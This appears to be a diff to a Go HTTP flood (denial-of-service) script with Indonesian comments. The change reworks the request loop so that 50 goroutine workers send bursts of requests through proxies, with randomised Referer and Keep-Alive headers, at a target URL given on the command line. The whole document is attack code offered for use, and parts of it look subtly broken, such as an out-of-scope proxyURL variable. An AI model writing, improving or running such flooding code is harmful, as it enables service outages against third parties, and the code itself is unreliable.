@@ -23,6 +23,14 @@ func buildblock(size int) (s string) {
     return string(a)
 }
 
+func readReferers(scanner *bufio.Scanner, ch chan string) {
+    for scanner.Scan() {
+        referer := scanner.Text()
+        ch <- referer
+    }
+    close(ch)
+}
+
 func main() {
     // Pastikan terdapat argumen baris perintah yang diberikan
     if len(os.Args) < 2 {
@@ -52,24 +60,18 @@ func main() {
         proxyURLs = append(proxyURLs, proxyURL)
     }
 
-        // Baca file referers.txt
+    
+    // Ciptakan chennel untuk membaca referers.txt
+    refererChannel := make(chan string)
     file, err := os.Open("referers.txt")
     if err != nil {
         fmt.Println(err)
         os.Exit(1)
     }
     defer file.Close()
+    refererScanner := bufio.NewScanner(file)
 
-    refererScanner := bufio.NewScanner(file) // Rename the second scanner variable to refererScanner (different name)
-    for refererScanner.Scan() {
-        referers = append(referers, refererScanner.Text())
-    }
-
-    if err := scanner.Err(); err != nil {
-        fmt.Println(err)
-        os.Exit(1)
-    }
-
+    go readReferers(refererScanner, refererChannel)
 
     // Membuat request dengan header khusus
     req, err := http.NewRequest("GET", targetURL, nil)
@@ -89,27 +91,33 @@ func main() {
     req.Header.Set("Keep-Alive", string(rand.Intn(10)+100))
     req.Header.Set("Connection", "keep-alive")
 
-    // Loop melalui daftar proxyURLs dan membuat request dengan menggunakan masing-masing proxy
-    for _, proxyURL := range proxyURLs {
-        go func(proxyURL *url.URL) { // Menggunakan goroutine untuk menjalankan setiap request secara paralel
+    for i := 0; i < 50; i++ {
+        go func() { // Menggunakan goroutine untuk menjalankan setiap worker secara paralel
             transport := &http.Transport{
                 Proxy: http.ProxyURL(proxyURL),
+                MaxIdleConns:        20,
+                MaxIdleConnsPerHost: 20,
             }
             client := &http.Client{
                 Timeout:   2000 * time.Millisecond,
                 Transport: transport,
             }
-            // Loop untuk mengirim 100 permintaan menggunakan satu proxy
-            for i := 0; i < 200; i++ {
-                resp, err := client.Do(req)
-                if err != nil {
-                    continue
+
+            for referer := range refererChannel {
+                req.Header.Set("Referer", referer+buildblock(rand.Intn(5)+5))
+
+                // Jalankan 100 permintaan menggunakan satu proxy dan referer
+                for j := 0; j < 100; j++ {
+                    resp, err := client.Do(req)
+                    if err != nil {
+                        continue
+                    }
+                    defer resp.Body.Close()
+                    fmt.Println("Request successful with proxy", proxyURL.String(), "for referer", referer, "Request number", j)
                 }
-                defer resp.Body.Close()
-                fmt.Println("Request successful with proxy", proxyURL.String(), "Request number", i+1)
             }
-        }(proxyURL) // Memanggil fungsi goroutine dengan menggunakan proxyURL sebagai argumen
+        }()
     }
+
     time.Sleep(50 * time.Second)
 }
-
